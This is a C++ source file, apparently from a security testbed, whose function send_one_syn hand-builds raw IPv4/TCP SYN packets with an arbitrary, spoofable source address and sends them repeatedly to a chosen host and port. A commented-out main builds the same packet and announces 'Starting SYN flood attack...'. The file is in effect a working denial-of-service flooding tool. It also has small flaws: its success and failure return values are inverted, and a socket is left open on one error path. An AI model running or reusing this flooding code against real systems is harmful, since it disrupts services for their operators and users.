extern "C" {
#include "../../c_api.h"
}

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/ip.h>    // struct ip (BSD)
#include <netinet/tcp.h>   // struct tcphdr (BSD), TH_* flags
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <iostream>

// Pseudo header for TCP checksum
struct pseudo_header {
    uint32_t saddr;
    uint32_t daddr;
    uint8_t  zero;
    uint8_t  protocol;
    uint16_t tcp_len;
} __attribute__((packed));

// RFC 1071 16-bit one's complement checksum
static uint16_t csum16(const void *data, size_t len) {
    uint32_t sum = 0;
    const uint16_t *p = (const uint16_t *)data;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

extern "C" bool send_one_syn(const char* src_ip_str, const char* dst_ip, unsigned short dst_port, int repeat) {

    // ... build IPv4 + TCP SYN
    // Buffer for IP + TCP headers (no payload)
    unsigned char packet[sizeof(struct ip) + sizeof(struct tcphdr)];
    memset(packet, 0, sizeof(packet));

    struct ip *iph = (struct ip *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct ip));

    // Fill IPv4 header (BSD layout)
    iph->ip_v   = 4;
    iph->ip_hl  = 5; // 5 * 4 = 20 bytes
    iph->ip_tos = 0;
    iph->ip_len = sizeof(packet);
    iph->ip_id  = htons(0x1234);
    iph->ip_off = 0;
    iph->ip_ttl = 64;
    iph->ip_p   = IPPROTO_TCP;
    if (inet_pton(AF_INET, src_ip_str, &iph->ip_src) != 1) {
        std::cout << "src ip error" << std::endl;
        return EXIT_FAILURE;
    }
    if (inet_pton(AF_INET, dst_ip, &iph->ip_dst) != 1) {
        std::cout << "dst ip error" << std::endl;
        return EXIT_FAILURE;
    }

    // Fill TCP header (BSD layout uses th_* and th_offx2)
    tcph->th_sport = htons(40000 + (rand() % 20000));
    tcph->th_dport = htons(dst_port);
    tcph->th_seq   = htonl(0xABCDEFFF);
    tcph->th_ack   = htonl(0);
    tcph->th_off   = 5;                         // <-- correct on macOS
    tcph->th_x2    = 0;
    tcph->th_flags = TH_SYN;        // set SYN
    tcph->th_win   = htons(65535);
    tcph->th_urp   = 0;

    // TCP checksum (pseudo header + TCP header [+ payload])
    struct pseudo_header ph;
    ph.saddr    = *(uint32_t *)&iph->ip_src;
    ph.daddr    = *(uint32_t *)&iph->ip_dst;
    ph.zero     = 0;
    ph.protocol = IPPROTO_TCP;
    ph.tcp_len  = htons(sizeof(struct tcphdr));

    unsigned char chkbuf[sizeof(ph) + sizeof(struct tcphdr)];
    memcpy(chkbuf, &ph, sizeof(ph));
    memcpy(chkbuf + sizeof(ph), tcph, sizeof(struct tcphdr));
    tcph->th_sum = csum16(chkbuf, sizeof(chkbuf));

    // IP checksum (required when you provide your own IP header)
    iph->ip_sum = csum16(iph, sizeof(struct ip));




    // Raw IP socket on macOS/BSD: use IPPROTO_RAW and set iph->ip_p to TCP
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        std::cout << "socket() error " << strerror(errno) << std::endl;
        return EXIT_FAILURE;
    }

    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        std::cout << "setsockopt(IP_HDRINCL) error" << std::endl;
        return EXIT_FAILURE;
    }

    struct sockaddr_in dst;
    #if defined(__APPLE__) || defined(__FreeBSD__) || defined(__OpenBSD__) || defined(__NetBSD__)
        dst.sin_len = sizeof(dst);   // macOS only
    #endif
    dst.sin_family = AF_INET;
    dst.sin_port = htons(dst_port);
    if (inet_pton(AF_INET, dst_ip, &dst.sin_addr) != 1) {
        std::cout << "dst addr error" << std::endl;
        close(s);
        return EXIT_FAILURE;
    }

    for (int i = 0; i < repeat; ++i) {

        ssize_t n = sendto(s, packet, sizeof(packet), 0,
                        (struct sockaddr *)&dst, sizeof(dst));
        if (n < 0) {
            std::cout << "sendto() error " << strerror(errno) << std::endl;
            // close(s);
            // return EXIT_FAILURE;
            continue;
        }

        std::cout << "Sent TCP SYN from " << src_ip_str << ":" << ntohs(tcph->th_sport)
                << " to " << dst_ip << ":" << dst_port << " (" << n << " bytes)"
                << std::endl;

        std::cout << "Sent SYN packet " << (i + 1) << " of " << repeat
                  << std::endl;
    }

    close(s);

    return EXIT_SUCCESS;
}





// #include <unistd.h>

// #include <fstream>
// #include <iostream>
// #include <thread>
// #include <arpa/inet.h>
// #include <sys/socket.h>
// #include <netinet/ip.h>   // struct iphdr
// #include <netinet/tcp.h>  // struct tcphdr

// struct pseudo_header {
//     uint32_t saddr;
//     uint32_t daddr;
//     uint8_t  zero;
//     uint8_t  protocol;
//     uint16_t tcp_len;
// };

// // Internet checksum (RFC 1071)
// static uint16_t csum16(const void *data, size_t len) {
//     uint32_t sum = 0;
//     const uint16_t *p = (const uint16_t*)data;

//     while (len > 1) {
//         sum += *p++;
//         len -= 2;
//     }

//     if (len) {
//         sum += *(const uint8_t*)p;
//     }

//     // fold 32-bit sum to 16 bits
//     while (sum >> 16) {
//         sum = (sum & 0xFFFF) + (sum >> 16);
//     }

//     return (uint16_t)(~sum);
// }

// // Pseudo header for TCP checksum

// int main(int argc, char* argv[]) {
//     if (argc != 2) {
//         std::cerr << "Usage: " << argv[0] << " <config_path>"
//                   << std::endl;
//         exit(1);
//     }

//     // This section can be removed
//     // Standard SST initialization
//     // char* config_path = argv[1];
//     // SST_ctx_t* ctx = init_SST(config_path);

//     // session_key_list_t* s_key_list = get_session_key(ctx, NULL);
//     // if (s_key_list == NULL) {
//     //     std::cerr << "Client failed to get session key.\n" << ::std::endl;
//     //     exit(1);
//     // }



//     const char *src_ip_str = "0.0.0.0";
//     const uint16_t src_port = 21800;
//     const char *dst_ip_str = "0.0.0.0";
//     const uint16_t dst_port = 21900;

//     // Raw socket
//     int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
//     if (s < 0) {
//         std::cerr << "socket() error" << std::endl;
//         return 1;
//     }

//     // Tell the kernel we’re including our own IP header
//     int one = 1;
//     if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
//         std::cerr << "setsockopt(IP_HDRINCL) error" << std::endl;
//         close(s);
//         return 1;
//     }

//     // Packet buffer: IP + TCP (no options), 20 + 20 bytes
//     uint8_t packet[sizeof(ip) + sizeof(struct tcphdr)];
//     memset(packet, 0, sizeof(packet));




//       // ---- IPv4 header (BSD/macOS struct ip) ----
//     struct ip *ip = (struct ip*)packet;

// #ifdef _IP_VHL
//     ip->ip_vhl = (4 << 4) | (sizeof(struct ip) >> 2); // version=4, IHL=5
// #else
// # if BYTE_ORDER == LITTLE_ENDIAN
//     ip->ip_v  = 4;
//     ip->ip_hl = (sizeof(struct ip) >> 2);
// # else
//     ip->ip_hl = (sizeof(struct ip) >> 2);
//     ip->ip_v  = 4;
// # endif
// #endif
//     ip->ip_tos = 0;
//     ip->ip_len = htons(sizeof(packet));
//     ip->ip_id  = htons((uint16_t)rand());
//     ip->ip_off = 0;
//     ip->ip_ttl = 64;
//     ip->ip_p   = IPPROTO_TCP;

//     if (inet_pton(AF_INET, src_ip_str, &ip->ip_src) != 1) { fprintf(stderr,"Bad src IP\n"); return 1; }
//     if (inet_pton(AF_INET, dst_ip_str, &ip->ip_dst) != 1) { fprintf(stderr,"Bad dst IP\n"); return 1; }

//     ip->ip_sum = 0; // zero before checksum


//     // ---- TCP header (BSD/macOS struct tcphdr) ----
//     struct tcphdr *tcp = (struct tcphdr*)(packet + sizeof(struct ip));
//     tcp->th_sport = htons(src_port);
//     tcp->th_dport = htons(dst_port);

//     srand((unsigned)time(NULL) ^ getpid());
//     tcp->th_seq   = htonl((uint32_t)rand());
//     tcp->th_ack   = htonl(0);

//     tcp->th_off   = (sizeof(struct tcphdr) >> 2); // 5
//     // th_x2 is the other 4-bit nibble; left 0
//     tcp->th_flags = TH_SYN;
//     tcp->th_win   = htons(64240);
//     tcp->th_sum   = 0;
//     tcp->th_urp   = 0;

//     // ---- Checksums ----
//     // IP header checksum (20 bytes)
//     ip->ip_sum = csum16(ip, sizeof(struct ip));

//     // TCP checksum over pseudo-header + TCP header (no payload)
//     struct pseudo_header psh;
//     psh.saddr    = ip->ip_src.s_addr;
//     psh.daddr    = ip->ip_dst.s_addr;
//     psh.zero     = 0;
//     psh.protocol = IPPROTO_TCP;
//     psh.tcp_len  = htons(sizeof(struct tcphdr));

//     uint8_t chksum_buf[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
//     memcpy(chksum_buf, &psh, sizeof(psh));
//     memcpy(chksum_buf + sizeof(psh), tcp, sizeof(struct tcphdr));
//     tcp->th_sum = csum16(chksum_buf, sizeof(chksum_buf));


//     std::cout << "Starting SYN flood attack..." << std::endl;


// }